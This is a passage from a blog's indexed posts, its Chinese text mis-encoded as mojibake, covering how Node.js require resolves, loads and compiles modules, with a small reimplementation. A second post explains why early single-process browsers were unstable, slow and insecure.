Object.keys(Module._extensions); // å°è¯•åŠ è½½æ–‡ä»¶å¤¹ä¸‹package.json é…ç½®çš„mainå­—æ®µå¯¹åº”çš„æ–‡ä»¶è·¯å¾„ filename = tryPackage(basePath, exts, isMain); if (!filename) &#123; // å°è¯•è·å–æ–‡ä»¶å¤¹ä¸‹çš„index.js filename = tryExtensions(path.resolve(basePath, &apos;index&apos;), exts, isMain); &#125; &#125; if (filename) &#123; // ç¼“å­˜è·¯å¾„ Module._pathCache[cacheKey] = filename; return filename; &#125; &#125; return false;&#125;; ç°åœ¨å›ç­”ç¬¬ä¸€ä¸ªé—®é¢˜ï¼Œnodeæ˜¯å¦‚ä½•æ‰¾åˆ°æ¨¡å—çš„é˜¶æ®µ1. ç²—æŸ¥é˜¶æ®µ å¦‚æœæ˜¯nodeæ ¸å¿ƒæ¨¡å—ï¼Œå°±ç›´æ¥è¿”å›æ¨¡å—åç§° å¦‚æœæ˜¯å¼•å…¥çš„ç¬¬ä¸‰æ–¹npmæ¨¡å—ï¼Œä¼šè¿”å›çˆ¶çº§æ‰€åœ¨æ–‡ä»¶å¤¹ä¸‹çš„node_modulesï¼Œçˆ¶çˆ¶çº§æ‰€åœ¨æ–‡ä»¶å¤¹ä¸‹çš„node_modulesï¼Œä¾æ¬¡é€’å½’ï¼Œä¸€ç›´åˆ°/node_moduleså’Œç”¨æˆ·åä¸‹çš„.node_modulesä»¥åŠå…¨å±€ç¯å¢ƒå˜é‡é…ç½®çš„å…¨å±€å®‰è£…çš„æ¨¡å—æ–‡ä»¶å¤¹ç»„æˆçš„æ•°ç»„ å¦‚æœæ˜¯ç›¸å¯¹è·¯å¾„å¼•å…¥çš„æ¨¡å—ï¼Œä¼šå°†ç›¸å¯¹è·¯å¾„å’Œçˆ¶çº§è·¯å¾„ä¹‹é—´è¿›è¡Œä¸€ä¸ªpath.resolve()ï¼Œç„¶åè¿”å› é˜¶æ®µ2. ç²¾ç¡®æŸ¥æ‰¾ï¼Œè·å–æ–‡ä»¶ç»å¯¹è·¯å¾„ä»¥require(â€˜expressâ€™)ä¸ºä¾‹ å…ˆå°è¯•åŠ è½½node_modules/expressï¼Œè¿™ç§æ²¡æœ‰æ‰©å±•åçš„æ–‡ä»¶æ˜¯å¦å­˜åœ¨ å°è¯•æŒ‰ç…§æ‰©å±•åè§„åˆ™æŸ¥æ‰¾ï¼Œä¾æ¬¡åˆ¤æ–­node_modulesæ–‡ä»¶å¤¹ä¸‹.js .json .nodeç»“å°¾çš„æ–‡ä»¶åä¸ºexpressçš„æ–‡ä»¶æ˜¯å¦å­˜åœ¨ï¼Œè¿”å›æ–‡ä»¶çš„ç»å¯¹è·¯å¾„ åˆ¤æ–­node_modules/expressæ–‡ä»¶å¤¹ä¸‹çš„package.jsonæ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœå­˜åœ¨ï¼Œè¿”å›mainå­—æ®µæŒ‡å®šçš„æ–‡ä»¶çš„ç»å¯¹è·¯å¾„ åˆ¤æ–­node_modules/express/index.jsæ˜¯å¦å­˜åœ¨ï¼Œå­˜åœ¨è¿”å›å¯¹åº”æ–‡ä»¶ç»å¯¹è·¯å¾„ è§£ææ¨¡å— Module._resolveFilename(request, parent, isMain);è·å–åˆ°æ–‡ä»¶ç»å¯¹è·¯å¾„ä¹‹åï¼Œæ‰§è¡ŒtryModuleLoad(module, filename); å°è¯•åŠ è½½æ¨¡å— tryModuleLoad ç›´æ¥è°ƒç”¨Module.prototype.loadå‡½æ•° 1234567891011Module.prototype.load = function(filename) &#123; this.filename = filename; // ä»¥æ–‡ä»¶ç»å¯¹è·¯å¾„ä¸ºåŸºå‡†ï¼Œåˆå§‹åŒ–node_modules this.paths = Module._nodeModulePaths(path.dirname(filename)); // å¦‚æœæ–‡ä»¶æ²¡æœ‰æ‰©å±•åï¼Œåˆå§‹åŒ–ä¸º.jsç»“å°¾çš„ var extension = path.extname(filename) || &apos;.js&apos;; // è°ƒç”¨æ‰©å±•åå¯¹åº”çš„è§£æè§„åˆ™ if (!Module._extensions[extension]) extension = &apos;.js&apos;; Module._extensions[extension](this, filename); this.loaded = true;&#125;; .js .json .nodeç»“å°¾çš„æ–‡ä»¶ï¼Œnodeçš„è§£æè§„åˆ™ 12345678910111213141516171819// Native extension for .jsModule._extensions[&apos;.js&apos;] = function(module, filename) &#123; var content = fs.readFileSync(filename, &apos;utf8&apos;); module._compile(stripBOM(content), filename);&#125;;// Native extension for .jsonModule._extensions[&apos;.json&apos;] = function(module, filename) &#123; var content = fs.readFileSync(filename, &apos;utf8&apos;); try &#123; module.exports = JSON.parse(stripBOM(content)); &#125; catch (err) &#123; err.message = filename + &apos;: &apos; + err.message; throw err; &#125;&#125;;// Native extension for .nodeModule._extensions[&apos;.node&apos;] = function(module, filename) &#123; return process.dlopen(module, path.toNamespacedPath(filename));&#125;; jsonä¼šç›´æ¥è¯»å–æ–‡ä»¶å†…å®¹ï¼ŒJSON.parseç›´æ¥è¾“å‡ºï¼Œ.nodeæ–‡ä»¶ä¼šä½¿ç”¨process.dlopen()æ‰§è¡Œæ–‡ä»¶ï¼Œè¿™ä¸¤ç§æ–‡ä»¶å¤„ç†æ¯”è¾ƒç®€å•ï¼Œè¿™é‡Œè¯¦ç»†åˆ†æ.jsç»“å°¾çš„æ–‡ä»¶ module._compileæ‰§è¡Œjsæ–‡ä»¶ç¼–è¯‘ 12345678910111213141516Module.prototype._compile = function(content, filename) &#123; // ... // å°†æ¨¡å—ä»£ç  var wrapper = Module.wrap(content); // å°†å­—ç¬¦ä¸²è½¬æ¢æˆå¯æ‰§è¡Œçš„jsä»£ç  var compiledWrapper = vm.runInThisContext(wrapper, &#123; filename: filename, lineOffset: 0, displayErrors: true &#125;); // ... // æ‰§è¡Œå‡½æ•° result = compiledWrapper.call(this.exports, this.exports, require, this, filename, dirname); return result;&#125; Module.wrapé€šè¿‡å­—ç¬¦ä¸²æ‹¼æ¥ï¼Œåœ¨ä»£ç å¤–åŒ…å«ä¸€ä¸ªå‡½æ•° 1234567Module.wrap = function(script) &#123; return Module.wrapper[0] + script + Module.wrapper[1];&#125;;Module.wrapper = [ &apos;(function (exports, require, module, __filename, __dirname) &#123; &apos;, &apos;\n&#125;);&apos;]; è°ƒç”¨vm.runInThisContextå°†å­—ç¬¦ä¸²è½¬ä¸ºå¯æ‰§è¡Œçš„jså‡½æ•° compiledWrapper.call(this.exports, this.exports, require, this, filename, dirname); æ‰§è¡Œå‡½æ•°ï¼Œmodule.exports, requireå‡½æ•°, moduleä½œä¸ºä¸‰ä¸ªå‚æ•°ï¼Œåœ¨å‡½æ•°å†…éƒ¨ç»™module.exportsè¿›è¡Œèµ‹å€¼ï¼Œæ¨¡å—å†…éƒ¨å¯ä»¥ä½¿ç”¨requireå‡½æ•°åŠ è½½æ¨¡å—ï¼Œå¯ä»¥è·å–åˆ°moduleå˜é‡ï¼Œæè¿°å½“å‰æ¨¡å—çš„ä¿¡æ¯ï¼Œ æ¨¡æ‹Ÿå®ç°requireå‡½æ•°1234567891011121314151617181920212223242526272829303132333435363738const path = require(&apos;path&apos;);const fs = require(&apos;fs&apos;);const vm = require(&apos;vm&apos;);function Module(id) &#123; this.id = id; this.exports = &#123;&#125;;&#125;Module._extensions = &#123;&#125;;let wrapper = [ &apos;(function(exports, module, require, __dirname, __filename)&#123;&apos;, &apos;&#125;)&apos;]Module._extensions[&apos;.js&apos;] = function(module) &#123; let script = fs.readFileSync(module.id, &apos;utf8&apos;); let fnStr = wrapper[0] + script + wrapper[1]; let fn = vm.runInThisContext(fnStr); fn.call(module.exports, module.exports, module, MyRequire);&#125;Module.prototype.load = function() &#123; let ext = path.extname(this.id); Module._extensions[ext](this);&#125;function MyRequire(filePath) &#123; let absPath = path.resolve(__dirname, filePath); let module = new Module(absPath); module.load(); return module.exports;&#125;let a = MyRequire(&apos;./test.js&apos;);console.log(a);]]></content>
      <categories>
        <category>Node.js</category>
      </categories>
      <tags>
        <tag>Node.js</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[æµè§ˆå™¨è¿›ç¨‹æ¶æ„çš„æ¼”åŒ–]]></title>
    <url>%2F2020%2F02%2F05%2FWeb%E5%89%8D%E7%AB%AF%2F%E6%B5%8F%E8%A7%88%E5%99%A8%E8%BF%9B%E7%A8%8B%E6%9E%B6%E6%9E%84%E7%9A%84%E6%BC%94%E5%8C%96%2F</url>
    <content type="text"><![CDATA[è½¬è½½è‡ªæ˜é‡‘ç½‘ç»œï¼ŒåŸæ–‡é“¾æ¥ï¼šhttps://juejin.im/post/5df1e10cf265da33f34b3243 å‰è¨€ æ›¾ç»ä½ ç”¨ IE6æˆ–IE7 æˆ–è€… firefox çš„æ—¶å€™æœ‰é‡åˆ°ä¸€ä¸ªæ’ä»¶å´©æºƒï¼Œè€Œä½ æ‰“å¼€çš„ä¸€ç³»åˆ—é¡µé¢å…¨éƒ¨å´©æºƒçš„åœºæ™¯ä¹ˆï¼ŸğŸ˜° æ›¾ç»ä½ é‡åˆ°è¿‡æ‰“å¼€æµè§ˆå™¨æˆ–æŸäº›é¡µé¢æ€»æ˜¯å¼¹å‡ºå¾ˆå¤šä½ ä¸æƒ³æ‰“å¼€çš„æ¶æ„çª—ï¼Œè¦ä¸€ä¸ªä¸€ä¸ªæ‰‹åŠ¨å‰æ‰çš„æƒ…å†µå—ï¼ŸğŸ˜¤ æ›¾ç»åœ¨ä½ æ‰“å¼€æŸä¸ªé¡µé¢ç”±äºæŸç§åŸå› æ•´ä¸ªæµè§ˆå™¨å°±å¡ä½ï¼Œè¿å…³é—­æŒ‰é’®éƒ½ç‚¹ä¸åŠ¨çš„æ—¶å€™ï¼Œä½ æ˜¯åªèƒ½å¼ºåˆ¶å…³æ‰æ•´ä¸ªæµè§ˆå™¨ä¹ˆï¼ŸğŸ¤” å¦‚æœä¸Šè¿°æƒ…å†µä½ éƒ½é‡è§è¿‡ï¼Œé‚£æˆ‘ä»¬ä»Šå¤©å°±æœ‰å¾—èŠäº†ã€‚å¦‚æœæ²¡é‡åˆ°ä¹Ÿæ²¡å…³ç³»ï¼Œä»Šå¤©çš„å†…å®¹ä¹Ÿä¼šè®©ä½ æ‹“å±•ä¸€ä¸‹è§†é‡ï¼Œå½“ä½ çœŸæ­£é‡åˆ°çš„æ—¶å€™ï¼Œä¸è‡³äºä¸€å¤´é›¾æ°´ã€‚ ä»Šå¤©çš„ä¸»é¢˜æ˜¯ã€Šæµè§ˆå™¨è¿›ç¨‹æ¶æ„çš„æ¼”åŒ–ã€‹ï¼Œå¯èƒ½ä½ ä¼šé—®äº†ï¼Œä»€ä¹ˆæ˜¯æµè§ˆå™¨è¿›ç¨‹æ¶æ„ã€‚å…¶å®å¾ˆç®€å•ï¼Œæ¶æ„æŒ‡çš„æ˜¯ä¸€ä¸ªè½¯ä»¶çš„å„ä¸ªæ–¹é¢çš„è®¾è®¡ï¼Œé‚£æµè§ˆå™¨è¿›ç¨‹æ¶æ„ä½ å°±å¯ä»¥ç†è§£ä¸º æµè§ˆå™¨æ˜¯æ€ä¹ˆè®¾è®¡å…¶è¿›ç¨‹çš„æ“ä½œå’Œç®¡ç†æ–¹å¼çš„ æˆ‘ä»¬ä¼šå°†å„ç§æµè§ˆå™¨æ”¾åˆ°ä¸€èµ·æ¥èŠä¸€èŠè¿™äº› æµè§ˆå™¨åœ¨å†å²å‘å±•è¿‡ç¨‹ä¸­ï¼Œå…¶è¿›ç¨‹æ¶æ„åšäº†å“ªäº›è°ƒæ•´ï¼Ÿä¸ºä»€ä¹ˆè¿™æ ·è°ƒæ•´ï¼Ÿè§£å†³äº†å“ªäº›é—®é¢˜ï¼Ÿ ç›¸ä¿¡çœ‹å®Œè¿™ç¯‡æ–‡ç« ï¼Œèƒ½è®©ä½ æ˜ç™½å¼€å¤´æå‡ºçš„ä¸‰ä¸ªé—®é¢˜æ˜¯æ€ä¹ˆå›äº‹å„¿ï¼Œå¯¹ä½ ä»¥åé‡åˆ°çš„å…¶å®ƒé—®é¢˜ä¹Ÿç»™å‡ºä¸€ä¸ªæ€è€ƒæ–¹å‘ã€‚ å¥½äº†ï¼Œæ—¢ç„¶è¦è¯´è¿›ç¨‹æ¶æ„çš„æ¼”åŒ–ï¼Œé‚£ä½ çœŸçš„äº†è§£äº†è¿›ç¨‹æ˜¯æ€ä¹ˆå›äº‹å„¿ä¹ˆï¼Ÿä¸çº¿ç¨‹ä¹‹é—´æœ‰å•¥å…³ç³»ï¼Ÿæˆ‘ä»¬æ¥ç®€å•çš„è¿‡ä¸€é äº†è§£è¿›ç¨‹å’Œçº¿ç¨‹æˆ‘ä»¬ä¸€èˆ¬ä½¿ç”¨ç”µè„‘çš„æ—¶å€™éƒ½ä¼šæ‰“å¼€å¤šä¸ªç¨‹åºåŒæ—¶è¿è¡Œï¼Œæ¯”å¦‚åŒæ—¶æ‰“å¼€äº†éŸ³ä¹ç¨‹åºæ”¾ç€æ­Œï¼Œåˆæ‰“å¼€äº†æ–‡æ¡£ç¨‹åºå†™è®°å½•ï¼Œè¿˜å¼€äº†ä¸€ä¸ªä¸‹è½½ç¨‹åºä¸‹è½½ç”µå½±ã€‚ä½† CPUå…¶å®åœ¨æŸä¸€ä¸ªç‰¹å®šæ—¶åˆ»æ˜¯åªèƒ½æ‰§è¡Œä¸€ä¸ªç¨‹åºçš„ï¼ˆå…ˆä¸è€ƒè™‘å¤šæ ¸ï¼‰ï¼Œé‚£ä¹ˆæˆ‘ä»¬çš„ç”µè„‘åˆæ˜¯å¦‚ä½•åŒæ—¶è¿è¡Œå¤šä¸ªç¨‹åºçš„å‘¢ï¼Ÿ ç­”æ¡ˆå°±æ˜¯ è¿›ç¨‹ã€‚è¿›ç¨‹æ˜¯æ“ä½œç³»ç»Ÿä¸­çš„æ¦‚å¿µï¼Œæ“ä½œç³»ç»Ÿåœ¨é¢å¯¹åŒæ—¶å¤„ç†å¤šä¸ªç¨‹åºçš„æ—¶å€™ï¼Œå°†åº”ç”¨ç¨‹åºæŠ½è±¡ä¸ºè¿›ç¨‹æ¥è¿è¡Œã€‚è¿™æ ·ä¸€æ¥ï¼Œæ“ä½œç³»ç»Ÿå°±å¯ä»¥æ ¹æ®ä¸€å®šçš„è§„åˆ™å¿«é€Ÿçš„å°†CPUæ‰§è¡Œæ—¶é—´è¿™ä¸€å®è´µçš„èµ„æºåˆ†é…ç»™ä¸åŒçš„è¿›ç¨‹å»ä½¿ç”¨ï¼Œå› ä¸ºåˆ‡æ¢åˆ†é…çš„é€Ÿåº¦å¾ˆå¿«ï¼Œæ‰€ä»¥çœ‹èµ·æ¥å°±åƒæ˜¯å¤šä¸ªåº”ç”¨ç¨‹åºåŒæ—¶åœ¨è¿è¡Œä¸€æ ·ã€‚ ä½†æ˜¯åªæœ‰è¿›ç¨‹è¿˜ä¸å¤Ÿï¼Œå¾€å¾€ä¸€ä¸ªåº”ç”¨ç¨‹åºæ•´ä½“åœ¨æ‰§è¡Œçš„æ—¶å€™ä¼šå­˜åœ¨å¤šä¸ªå­ä»»åŠ¡çš„æƒ…å†µï¼Œå°±åƒä¸€ä¸ªåœ¨çº¿éŸ³ä¹ç¨‹åºåœ¨è¿è¡Œçš„æ—¶å€™ï¼Œéœ€è¦åŒæ—¶è¿è¡Œç½‘ç»œåŠ è½½çš„å­ç¨‹åºåŠ è½½éŸ³ä¹æµï¼Œè¿˜è¦è¿è¡ŒéŸ³ä¹æ•°æ®æµçš„ç¼–è§£ç å­ç¨‹åºï¼Œè¿˜ä¼šè¿è¡ŒéŸ³ä¹ç•Œé¢çš„UIç¨‹åºç­‰ã€‚å› è€Œæ“ä½œç³»ç»Ÿåˆåœ¨è¿›ç¨‹é‡Œé¢åˆ’åˆ†å‡ºäº† çº¿ç¨‹ çš„æ¦‚å¿µã€‚æœ‰äº†çº¿ç¨‹ï¼Œä¸€ä¸ªåº”ç”¨ç¨‹åºå°±å¯ä»¥åŒæ—¶ç®¡ç†è‡ªå·±çš„å¤šä¸ªå­ä»»åŠ¡äº†ã€‚ä»è¿™é‡Œæˆ‘ä»¬è¿˜è¦æ›´æ–°ä¸€ä¸ªæ¦‚å¿µï¼ŒCPUåœ¨æŸä¸ªç‰¹å®šæ—¶åˆ»å…¶å®åªèƒ½æ‰§è¡ŒæŸä¸ªçº¿ç¨‹ ã€‚ æˆ‘ä»¬å†æ¥æ•´ä½“è¿‡ä¸€éä¸€ä¸ªç¨‹åºçš„è¿è¡Œã€‚å½“ä½ è¿è¡Œä¸€ä¸ªåº”ç”¨ç¨‹åºçš„æ—¶å€™ï¼Œæ“ä½œç³»ç»Ÿä¼šæŠŠä½ çš„åº”ç”¨ç¨‹åºå°è£…ä¸ºä¸€ä¸ªè¿›ç¨‹æ¥è¿è¡Œã€‚å› ä¸ºç¨‹åºè¿è¡Œæ˜¯éœ€è¦å†…å­˜çš„ï¼Œæ‰€ä»¥åœ¨åˆ†é…çº¿ç¨‹çš„æ—¶å€™ä¹Ÿä¼šåŒæ—¶ç»™ä½ åˆ†é…ä¸€å—å„¿å¯¹åº”çš„å†…å­˜ï¼Œç”¨æ¥å­˜å‚¨ç¨‹åºä»£ç ã€æ•°æ®å’Œæ–‡ä»¶èµ„æºç­‰ã€‚å½“ä½ çš„è¿›ç¨‹éœ€è¦æ‰§è¡Œå­ä»»åŠ¡çš„æ—¶å€™ï¼Œå°±å¯ä»¥åˆ›å»ºæ–°çš„çº¿ç¨‹æ¥æ‰§è¡Œã€‚ è¿™é‡Œæˆ‘ä»¬éœ€è¦äº†è§£å‡ ä¸ªç‰¹æ€§ï¼š çº¿ç¨‹å…±äº«è¿›ç¨‹èµ„æºã€‚è¿›ç¨‹æ˜¯æ“ä½œç³»ç»Ÿåˆ†é…èµ„æºçš„åŸºæœ¬å•ä½ï¼Œæ‰€ä»¥è¿›ç¨‹æ‰€éœ€è¦çš„ç³»ç»Ÿèµ„æºéƒ½æ˜¯æ“ä½œç³»ç»Ÿç»™çš„ï¼Œè€Œé‡Œé¢çš„çº¿ç¨‹è¦ç”¨èµ„æºçš„æ—¶å€™åªèƒ½å…±äº«è¿›ç¨‹æ‰€æ‹¥æœ‰çš„èµ„æºã€‚è¿™ç§èµ„æºåŒ…æ‹¬å†…å­˜ç©ºé—´ï¼Œä¹ŸåŒ…æ‹¬æ“ä½œç³»ç»Ÿçš„æƒé™ã€‚ ä¸€ä¸ªçº¿ç¨‹å´©æºƒï¼Œæ•´ä¸ªè¿›ç¨‹è·Ÿç€å´©ã€‚ å…¶å®å¾ˆå¥½ç†è§£ï¼Œä¸€ä¸ªç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­ï¼Œå¦‚æœæŸä¸ªçº¿ç¨‹å‡ºé”™äº†ï¼Œå› ä¸ºå†…å­˜æ˜¯å…±äº«çš„ï¼Œé‚£å¦‚æœäº§ç”Ÿäº†é”™è¯¯çš„æ•°æ®ï¼Œæ•´ä¸ªè¿›ç¨‹æœ€ç»ˆæ‰§è¡Œç»“æœä¹Ÿå¾ˆå¯èƒ½æ˜¯é”™çš„ã€‚æ‰€ä»¥æ“ä½œç³»ç»Ÿå°±ç›´æ¥å…¨éƒ¨å¹²æ‰äº†ã€‚ è¿›ç¨‹ä¹‹é—´ç›¸äº’éš”ç¦»ï¼Œé€šè¿‡IPCè¿›è¡Œé€šä¿¡ã€‚ è™½ç„¶æˆ‘ä»¬ä¸€ç›´è¯´ä¸€ä¸ªè¿›ç¨‹å°±æ˜¯ä¸€ä¸ªåº”ç”¨ç¨‹åºï¼Œä½†æœ‰çš„æ—¶å€™ä¸€ä¸ªåº”ç”¨ç¨‹åºä¹Ÿæœ‰å¯èƒ½ä¼šå¯åŠ¨å­è¿›ç¨‹ï¼Œè¿›ç¨‹ä¹‹é—´çš„æ•°æ®å‘¢åˆæ˜¯éš”ç¦»å¼€çš„ï¼Œå„è‡ªä¸ºæˆ˜ã€‚è¦åŒæ­¥æŸäº›æ•°æ®å†…å®¹ï¼Œå°±å¯ä»¥é€šè¿‡æŸç§è¿›ç¨‹é—´é€šä¿¡ï¼ˆIPCï¼‰çš„æ‰‹æ®µæ¥è¿›è¡Œã€‚ï¼ˆIPCæ˜¯ä¸€ä¸ªç»Ÿç§°ï¼ŒæŒ‡å¯ç”¨äºä¸åŒè¿›ç¨‹ä¹‹é—´é€šä¿¡çš„æ‰‹æ®µï¼Œè¿™é‡Œæ— éœ€ç»†ç©¶ï¼‰ æ—©æœŸçš„å•è¿›ç¨‹æµè§ˆå™¨æ—©æœŸçš„æµè§ˆå™¨åŒ…æ‹¬IE7åŠä¹‹å‰çš„IEæµè§ˆå™¨ï¼ŒFirefoxæµè§ˆå™¨éƒ½æ˜¯ä½¿ç”¨çš„å•è¿›ç¨‹çš„æµè§ˆå™¨æ¶æ„ï¼Œä¹Ÿå°±æ˜¯è¯´æ•´ä¸ªæµè§ˆå™¨ç¨‹åºéƒ½æ˜¯åœ¨ä¸€ä¸ªè¿›ç¨‹ä¸­è¿è¡Œçš„ã€‚ä¸åŒç±»å‹çš„æµè§ˆå™¨çš„å®é™…è¿›ç¨‹æ¶æ„è‚¯å®šæ˜¯æœ‰ä¸€å®šçš„å·®å¼‚çš„ï¼Œä¸ºäº†æè¿°æ–¹ä¾¿ï¼Œæˆ‘ä»¬éƒ½ç®€åŒ–ä¸ºä¸‹é¢çš„è¿™å¼ å›¾æ¥è¯´æ˜ä¸€ä¸‹å•è¿›ç¨‹æµè§ˆå™¨å­˜åœ¨çš„é—®é¢˜ã€‚ åœ¨è¿™æ ·çš„è¿›ç¨‹æ¶æ„é‡Œï¼Œæ•´ä¸ªè¿›ç¨‹é™¤äº†è¦è¿è¡Œæµè§ˆå™¨çª—å£ï¼Œä¸‹è½½èµ„æºï¼Œå…¶ä¸­çš„é¡µé¢çº¿ç¨‹è¿˜è¦åŒæ—¶æ‰¿æ‹…äº†é¡µé¢æ¸²æŸ“ã€JSæ‰§è¡Œä»¥åŠå„ç§æ’ä»¶çš„è¿è¡Œã€‚è¿™æ ·çš„ä¸€ä¸ªè¿›ç¨‹è¿è¡Œèµ·æ¥åœ¨æˆ‘ä»¬ç°åœ¨çœ‹æ¥å…¶å®æ˜¯æœ‰ç‚¹åˆ€å°–ä¸Šè·³èˆçš„æ„Ÿè§‰ã€‚å› ä¸ºè¿™æ ·æ¥è¿è¡ŒåŒ…å«å¾ˆå¤šé¡µé¢ç”šè‡³å¾ˆå¤šæ’ä»¶çš„å’ŒåŠŸèƒ½çš„æµè§ˆå™¨ï¼Œä¼šåŠå…¶çš„ä¸ç¨³å®šï¼Œä¸æµç•…å’Œä¸å®‰å…¨ å…ˆæ¥çœ‹çœ‹ä¸ºå•¥ä¸ç¨³å®šã€‚æˆ‘ä»¬å›åˆ°æœ€å¼€å§‹æçš„é—®é¢˜ï¼Œæ›¾ç»ä½ æœ‰ç”¨IE6ã€7æˆ–è€…Firefoxçš„æ—¶å€™ï¼Œä¸€ä¸ªæ’ä»¶æˆ–é¡µé¢å´©çš„æ—¶å€™ï¼Œæ•´ä¸ªé¡µé¢å´©çš„æƒ…å†µå—ï¼Ÿ ç°åœ¨å¬èµ·æ¥æ˜¯ä¸æ˜¯æœ‰ç‚¹ç†Ÿæ‚‰ï¼Œå¯èƒ½ä½ å¿ƒé‡Œå·²ç»æœ‰ç­”æ¡ˆäº†å§ã€‚æˆ‘ä»¬åˆšæ‰è°ˆåˆ°ï¼Œçº¿ç¨‹å´©æºƒï¼Œæ•´ä¸ªè¿›ç¨‹ä¹Ÿä¼šå…¨éƒ¨å´©æ‰ã€‚åœ¨å•è¿›ç¨‹æ¶æ„çš„æµè§ˆå™¨é‡Œï¼Œæˆ‘ä»¬çš„é¡µé¢æ¸²æŸ“å¼•æ“ã€æ’ä»¶ç¨‹åºï¼Œè¿˜æœ‰åƒIEé‡Œæœ‰å¾ˆå¤šåŠ¨æ€é“¾æ¥åº“çš„ç¨‹åºéƒ½æ˜¯å¯èƒ½å‡ºé”™çš„âŒï¼Œé‚£ä¹ˆä¸ç®¡è¿™äº›ç¨‹åºåœ¨è¿›ç¨‹ä¸­çš„å“ªä¸ªçº¿ç¨‹é‡Œé¢è¿è¡Œï¼Œå…¶å®åªè¦æœ‰ä¸€ä¸ªå‡ºäº†ä¸ªé”™ï¼Œé‚£ä¹ˆæ•´ä¸ªæµè§ˆå™¨å°±æŒ‚æ‰äº†ã€‚è¿™å°±æ˜¯æˆ‘ä»¬è¯´çš„ä¸ç¨³å®šã€‚ å†æ¥çœ‹çœ‹ä¸æµç•…ã€‚æˆ‘ä»¬å·²ç»çŸ¥é“CPUå…¶å®åœ¨æŸä¸ªæ—¶é—´ç‚¹åªèƒ½æ‰§è¡ŒæŸä¸ªè¿›ç¨‹ä¸­çš„æŸä¸€æ¡çº¿ç¨‹ã€‚é‚£ä¹ˆå½“æˆ‘ä»¬ä¸€ä¸ªé¡µé¢çº¿ç¨‹ä¸­æ—¢åŒ…å«äº†é¡µé¢çš„æ¸²æŸ“åˆåŒ…å«äº†JSçš„æ‰§è¡Œï¼Œè¿˜æœ‰å„ç§æ’ä»¶æ‰§è¡Œçš„æ—¶å€™ã€‚å‡è®¾æˆ‘ä»¬JSä»£ç ä¸­å†™äº†ä¸€ä¸ªæ­»å¾ªç¯çš„ä»»åŠ¡ï¼Œé‚£å¯æƒ³è€ŒçŸ¥ï¼Œæ•´ä¸ªæµè§ˆå™¨ä¸­çš„å…¶ä»–ä»»åŠ¡å°±éƒ½æ²¡æ³•æ‰§è¡Œä¸‹å»äº†â€”â€”ä¹Ÿå°±å¡ä½äº†ã€‚é‚£ä¹ˆå³ä½¿æˆ‘ä»¬ä¸é‚£ä¹ˆæš´èºï¼Œåªæ˜¯æˆ‘ä»¬çš„JSæˆ–è€…æ’ä»¶ç¨‹åºéœ€è¦ä¸€ç›´è¿è¡Œä¸€äº›ä¸œè¥¿ï¼Œå½“ä½ é¡µé¢æ­£åœ¨ç”¨JSæ‰§è¡ŒåŠ¨ç”»çš„æ—¶å€™ï¼ŒCPUçªç„¶è¢«æ’ä»¶è¿›ç¨‹æŠ¢è¿‡å»æ‰§è¡Œå…¶ä»–ä»»åŠ¡äº†ï¼Œé‚£ä½ çš„åŠ¨ç”»æ•ˆæœæ€•ä¸æ˜¯å¡å¾—ä½ å¿ƒæ…Œ ğŸ˜« æœ€åè¯´ä¸€ä¸‹ä¸å®‰å…¨çš„é—®é¢˜ï¼Œè¿™å°±è¦ç”¨åˆ°å¦ä¸€æ¡æˆ‘ä»¬åˆšæè¿‡çš„ç‰¹æ€§äº†â€”â€”çº¿ç¨‹å…±äº«è¿›ç¨‹èµ„æºã€‚åœ¨windowsä¸Šç”¨è¿‡æ€æ¯’è½¯ä»¶å’Œå„ç§å®‰å…¨å«å£«è½¯ä»¶çš„åº”è¯¥å¯¹ â€œæ¶æ„æ’ä»¶â€ è¿™ä¸ªè¯ä¸é™Œç”Ÿå§ã€‚æ’ä»¶è¿™ç§ä¸œè¥¿æœ¬æ¥æ˜¯ç”¨æ¥ä¾¿æ·çš„æ‰©å±•æµè§ˆå™¨åŠŸèƒ½ç‰¹æ€§çš„ï¼Œæ¯”å¦‚æˆ‘ä»¬æœ€å¸¸è§çš„Adobe Flash Playerè¿™ä¸ªæ’ä»¶ï¼Œä»¥å‰å‡ ä¹äººæ‰‹å¿…å¤‡ã€‚å½“æµè§ˆå™¨å’Œæ’ä»¶çš„ç¨‹åºåœ¨ä¸€ä¸ªé¡µé¢é‡Œé¢è¿è¡Œçš„æ—¶å€™ï¼Œå› ä¸ºè¿›ç¨‹çš„å†…å­˜æ˜¯è¢«å…±äº«çš„ï¼Œå› è€Œæ’ä»¶å°±èƒ½è·å–åˆ°æµè§ˆå™¨è¿è¡Œè¿‡ç¨‹ä¸­çš„æ•°æ®ï¼Œä»¥åŠæ‹¥æœ‰å’Œæµè§ˆå™¨åŒç­‰çš„ç³»ç»Ÿæƒé™ã€‚é‚£ä¹ˆå½“ä½ çš„ç³»ç»Ÿæ„ŸæŸ“äº†æ¶æ„æ’ä»¶ï¼Œåœ¨æµè§ˆå™¨è¿è¡Œçš„è¿‡ç¨‹ä¸­ï¼Œè¿™ä¸ªæ’ä»¶å°±å¯ä»¥è®°å½•ä½ è¾“å…¥åˆ°ç½‘é¡µçš„å¯†ç ï¼Œç»™ä½ å¼¹å‡ºå„ç§çª—å£ï¼Œæ‰“å¼€å¤šä¸ªç½‘é¡µç­‰ç­‰ã€‚ç°åœ¨ä½ çŸ¥é“æ›¾ç»ä½ æ‰‹åŠ¨ä¸€ä¸ªä¸€ä¸ªå‰æ‰çš„é‚£äº›æ— æ•…æ‰“å¼€çš„é¡µé¢æ˜¯æ€ä¹ˆæ¥çš„å§ï¼ŒåŒæ—¶ä½ ä¹Ÿåº”è¯¥äº†è§£åˆ°å½“åˆQQå·è¢«ç›—çš„ä¸€ç§å¯èƒ½çš„åŸå› äº†å§ã€‚ è¿™å°±æ˜¯æ—©æœŸçš„å•è¿›ç¨‹æµè§ˆå™¨å­˜åœ¨çš„é—®é¢˜ï¼Œä¸ç¨³å®šã€ä¸æµç•…å’Œä¸å®‰å…¨ã€‚è€Œè¿™ä¸€åˆ‡éƒ½æ˜¯ç”±äºæŠŠæ‰€æœ‰çš„ä¸œè¥¿åƒæ‰é¢å›¢ä¸€æ ·çš„æ”¾åˆ°ä¸€èµ·æ‰€äº§ç”Ÿçš„é—®é¢˜ï¼ŒèŒè´£æ˜¯æ··æ·†ä¸æ¸…çš„ã€æƒé™æ˜¯ä¸€ç»™å…¨ç»™çš„ã€è¿˜æœ‰ â€œä¸€äººæ”¾ç«å…¨å®¶é­æ®ƒâ€ çš„é£é™©ã€‚ 